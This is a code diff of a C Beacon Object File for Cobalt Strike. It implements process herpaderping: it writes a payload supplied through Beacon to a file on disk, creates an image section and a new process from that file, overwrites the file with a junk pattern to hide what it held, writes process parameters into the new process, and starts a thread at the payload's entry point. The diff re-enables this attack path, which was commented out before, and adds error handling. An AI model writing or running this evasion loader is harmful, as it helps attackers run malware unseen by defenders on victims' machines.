@@ -2,20 +2,6 @@
 #include "bofdefs.h"
 
 
-
-#pragma region error_handling
-#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
-BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
-#ifdef BOF
-	BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line, msg, hr);
-#else
-	printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
-#endif // BOF
-
-	return FALSE;
-}
-#pragma endregion
-
 typedef LONG KPRIORITY;
 typedef int WINBOOL, * PWINBOOL, * LPWINBOOL;
 typedef enum _PROCESSINFOCLASS
@@ -622,11 +608,19 @@ NTSYSAPI NTSTATUS NTAPI NTDLL$RtlCreateProcessParametersEx(
 
 BOOL CopyBytesByHandle(PBYTE peBytes,DWORD size,HANDLE targetHandle) {
     DWORD bytesWritten;
-    return KERNEL32$WriteFile(targetHandle,
+    KERNEL32$WriteFile(targetHandle,
         peBytes,
         size,
         &bytesWritten,
         NULL);
+    if(bytesWritten == size){
+        BeaconPrintf(CALLBACK_OUTPUT,"Successfully written %d bytes on targetFile\n",bytesWritten);
+        return TRUE;
+    }
+    else{
+        BeaconPrintf(CALLBACK_OUTPUT,"Not written all bytes. Written %d bytes\n. Aborting...",bytesWritten);
+        return FALSE;
+    }
 }
 
 BOOL MyGetFileSize(HANDLE FileHandle, LARGE_INTEGER* FileSize) {
@@ -684,8 +678,10 @@ BOOL OverwriteFileContentsWithPattern(HANDLE FileHandle, PBYTE pattern, int patt
     LARGE_INTEGER toMove;
     toMove.QuadPart = 0;
     if (!KERNEL32$SetFilePointerEx(FileHandle, toMove, NULL, FILE_BEGIN)) {
+        BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed SetFilePointerEx.");
         return FALSE;
     }
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] Success SetFilePointerEx.\n");
     LONGLONG bytesRemaining = fileSize.QuadPart;
     while (bytesRemaining > 0)
     {
@@ -693,18 +689,27 @@ BOOL OverwriteFileContentsWithPattern(HANDLE FileHandle, PBYTE pattern, int patt
         {
             DWORD bytesWritten = 0;
             KERNEL32$WriteFile(FileHandle, pattern, bytesRemaining, &bytesWritten, NULL);
+            if(bytesWritten != bytesRemaining){
+                BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed WriteFile.\n");
+                return FALSE;
+            }
             bytesRemaining -= bytesWritten;
         }
         else {
             DWORD bytesWritten = 0;
             KERNEL32$WriteFile(FileHandle, pattern, patternLength, &bytesWritten, NULL);
+            if(bytesWritten != patternLength){
+                BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed WriteFile.\n");
+                return FALSE;
+            }
             bytesRemaining -= bytesWritten;
         }
     }
+    BeaconPrintf(CALLBACK_OUTPUT,"[+] File successfully overwritten with pattern\n");
     return TRUE;
     
 }
-HRESULT WriteRemoteProcessParameters(
+BOOL WriteRemoteProcessParameters(
     handle_t ProcessHandle,
     LPWSTR ImageFileName,
     LPWSTR DllPath,
@@ -724,7 +729,7 @@ HRESULT WriteRemoteProcessParameters(
     UNICODE_STRING desktopInfo;
     UNICODE_STRING shellInfo;
     UNICODE_STRING runtimeData;
-    PRTL_USER_PROCESS_PARAMETERS params;
+    PRTL_USER_PROCESS_PARAMETERS params = NULL;
 
     NTDLL$RtlInitUnicodeString(&imageName, ImageFileName);
     NTDLL$RtlInitUnicodeString(&dllPath, DllPath);
@@ -737,26 +742,41 @@ HRESULT WriteRemoteProcessParameters(
 
     PROCESS_BASIC_INFORMATION pbi;
 
-    NTDLL$NtQueryInformationProcess(
+    NTSTATUS res = NTDLL$NtQueryInformationProcess(
         ProcessHandle,
         ProcessBasicInformation,
         &pbi,
         sizeof(pbi),
         NULL);
 
-    NTDLL$RtlCreateProcessParametersEx(
+    if(res != NT_SUCCESS){
+        BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed NtQueryInformationProcess.");
+        return FALSE;
+    }
+    
+    BeaconPrintf(CALLBACK_OUTPUT,"Success NtQueryInformationProcess.\npbi.UniqueProcessId: %d\npbi.PebBaseAddress: 0x%p\n",pbi.UniqueProcessId,pbi.PebBaseAddress);
+    
+    
+    res = NTDLL$RtlCreateProcessParametersEx(
         &params,
         &imageName,
-        &dllPath,
-        &currentDirectory,
+        NULL,
+        NULL,
         &commandLine,
         EnvironmentBlock,
         &windowTitle,
         &desktopInfo,
-        &shellInfo,
-        &runtimeData,
+        NULL,
+        NULL,
         0);
     
+    if(res != NT_SUCCESS){
+        BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed RtlCreateProcessParametersEx. params: 0x%p\n",params);
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT,"Success RtlCreateProcessParametersEx. params: 0x%p\n",params);
+
     SIZE_T len = params->MaximumLength + params->EnvironmentSize;
 
     LPVOID remoteMemory = KERNEL32$VirtualAllocEx(ProcessHandle,
@@ -790,7 +810,7 @@ HRESULT WriteRemoteProcessParameters(
 
     return TRUE;
 }
-#ifdef BOF
+
 void go(char* buff, int len) {
     datap parser;
     char* peName;
@@ -818,7 +838,7 @@ void go(char* buff, int len) {
     BeaconPrintf(CALLBACK_OUTPUT, "shellcode len: %d\n", shellcode_len);
     BeaconPrintf(CALLBACK_OUTPUT, "shellcode addr: 0x%p\n", shellcode);
 
-    HANDLE targetFileHandle = KERNEL32$CreateFileA("C:\\Users\\Administrator\\Desktop\\myfile.exe",
+    HANDLE targetFileHandle = KERNEL32$CreateFileA("C:\\Users\\Administrator\\Desktop\\myfile2.exe",
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         NULL,
@@ -827,10 +847,19 @@ void go(char* buff, int len) {
         NULL);
 
     BeaconPrintf(CALLBACK_OUTPUT, "targetFileHandle 0x%p\n", targetFileHandle);
-
-    KERNEL32$CloseHandle(targetFileHandle);
-    /*
-    CopyBytesByHandle(shellcode, shellcode_len, targetFileHandle);
+    
+    if(targetFileHandle == INVALID_HANDLE_VALUE){
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed CreateFile targetFileHandle 0x%p\n", targetFileHandle);
+        return;
+    }
+    else{
+        BeaconPrintf(CALLBACK_OUTPUT, "Success CreateFile targetFileHandle 0x%p\n", targetFileHandle);
+    
+    }
+    if(!CopyBytesByHandle(shellcode, shellcode_len, targetFileHandle)){
+        KERNEL32$CloseHandle(targetFileHandle);
+        return;
+    }
 
     HANDLE sectionHandle;
     NTSTATUS res = NTDLL$NtCreateSection(&sectionHandle,
@@ -842,8 +871,12 @@ void go(char* buff, int len) {
         targetFileHandle);
 
     if (res != NT_SUCCESS) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[!] Error creating RWX memory section  Aborting...");
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] SectionHandle failed. sectionHandle: 0x%p\n",sectionHandle);
+        KERNEL32$CloseHandle(targetFileHandle);
         return;
+    }
+    else{
+        BeaconPrintf(CALLBACK_OUTPUT, "NtCreateSection success. sectionHandle: 0x%p\n",sectionHandle);
     }
 
     HANDLE processHandle;
@@ -856,16 +889,28 @@ void go(char* buff, int len) {
         NULL,
         NULL,
         0);
+
     KERNEL32$CloseHandle(sectionHandle);
 
+    if (res != NT_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[!] NtCreateProcessEx failed. processHandle: 0x%p\n",processHandle);
+        KERNEL32$CloseHandle(targetFileHandle);
+        return;
+    }
+    else{
+        BeaconPrintf(CALLBACK_OUTPUT, "NtCreateProcessEx success. processHandle: 0x%p\n",processHandle);
+    }
     DWORD imageEntryPointRva = 0;
     GetImageEntryPointRva(targetFileHandle, &imageEntryPointRva);
-    BeaconPrintf(CALLBACK_OUTPUT, "EntryPoint RVA: 0x%08x", imageEntryPointRva);
+    BeaconPrintf(CALLBACK_OUTPUT, "EntryPoint RVA: 0x%08x\n", imageEntryPointRva);
 
     BYTE pattern[4] = {'\x82', '\x7f', '\x76', '\x7c'};
     int patternLength = 4;
     
-    OverwriteFileContentsWithPattern(targetFileHandle, (PBYTE)(&(pattern[0])), patternLength);
+    if(!OverwriteFileContentsWithPattern(targetFileHandle, (PBYTE)(&(pattern[0])), patternLength)){
+        KERNEL32$CloseHandle(targetFileHandle);
+        return;
+    }
     
     PROCESS_BASIC_INFORMATION pbi;
 
@@ -876,33 +921,39 @@ void go(char* buff, int len) {
         NULL);
     if (status != NT_SUCCESS)
     {
-        BeaconPrintf(CALLBACK_OUTPUT, "Failed to query new process info");
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to query new process info\n");
+        KERNEL32$CloseHandle(targetFileHandle);
         return;
     }
     PEB peb;
 
     if (!KERNEL32$ReadProcessMemory(processHandle, (LPCVOID)pbi.PebBaseAddress, (LPVOID)&peb, sizeof(PEB), (SIZE_T *)NULL)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get target PEB");
+        KERNEL32$CloseHandle(targetFileHandle);
+        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get target PEB\n");
+        return;
     }
     BeaconPrintf(CALLBACK_OUTPUT,
-        "Writing process parameters, remote PEB ProcessParameters 0x%p",
+        "Writing process parameters, remote PEB ProcessParameters 0x%p\n",
         (PBYTE)pbi.PebBaseAddress+FIELD_OFFSET(PEB, ProcessParameters));
     
 
-    WriteRemoteProcessParameters(
+    if(!WriteRemoteProcessParameters(
         processHandle,
-        L"C:\\Users\\Administrator\\Desktop\\myfile.exe",
+        L"C:\\Users\\Administrator\\Desktop\\myfile2.exe",
         L"",
         L"",
-        L"\"C:\\Users\\Administrator\\Desktop\\myfile.exe\"",
+        L"\"C:\\Users\\Administrator\\Desktop\\myfile2.exe\"",
         NtCurrentTeb()->ProcessEnvironmentBlock->ProcessParameters->Environment,
-        L"C:\\Users\\Administrator\\Desktop\\myfile.exe",
+        L"C:\\Users\\Administrator\\Desktop\\myfile2.exe",
         L"WinSta0\\Default",
         L"",
-        L"");
+        L"")){
+            KERNEL32$CloseHandle(targetFileHandle);
+            return;
+        }
 
     void* remoteEntryPoint = (LPBYTE)peb.ImageBaseAddress + imageEntryPointRva;
-    BeaconPrintf(CALLBACK_OUTPUT, "Creating thread in process at entry point 0x%p", remoteEntryPoint);
+    BeaconPrintf(CALLBACK_OUTPUT, "Creating thread in process at entry point 0x%p\n", remoteEntryPoint);
 
     HANDLE threadHandle;
     status = NTDLL$NtCreateThreadEx(&threadHandle,
@@ -917,20 +968,13 @@ void go(char* buff, int len) {
         0,
         NULL);
     if (status == NT_SUCCESS) {
-        BeaconPrintf(CALLBACK_OUTPUT,"Spawned thread with tId: %d",KERNEL32$GetThreadId(threadHandle));
+        BeaconPrintf(CALLBACK_OUTPUT,"Spawned thread with tId: %d\n",KERNEL32$GetThreadId(threadHandle));
     }
     else {
-        BeaconPrintf(CALLBACK_OUTPUT, "failed ntCreateThreadEx. ThreadHandle: 0x%p", threadHandle);
+        BeaconPrintf(CALLBACK_OUTPUT, "failed ntCreateThreadEx. ThreadHandle: 0x%p\n", threadHandle);
+        KERNEL32$CloseHandle(targetFileHandle);
         return;
-    }*/
+    }
+    KERNEL32$CloseHandle(targetFileHandle);
 
 }
-
-
-#else
-
-void main(int argc, char* argv[]) {
-
-}
-
-#endif
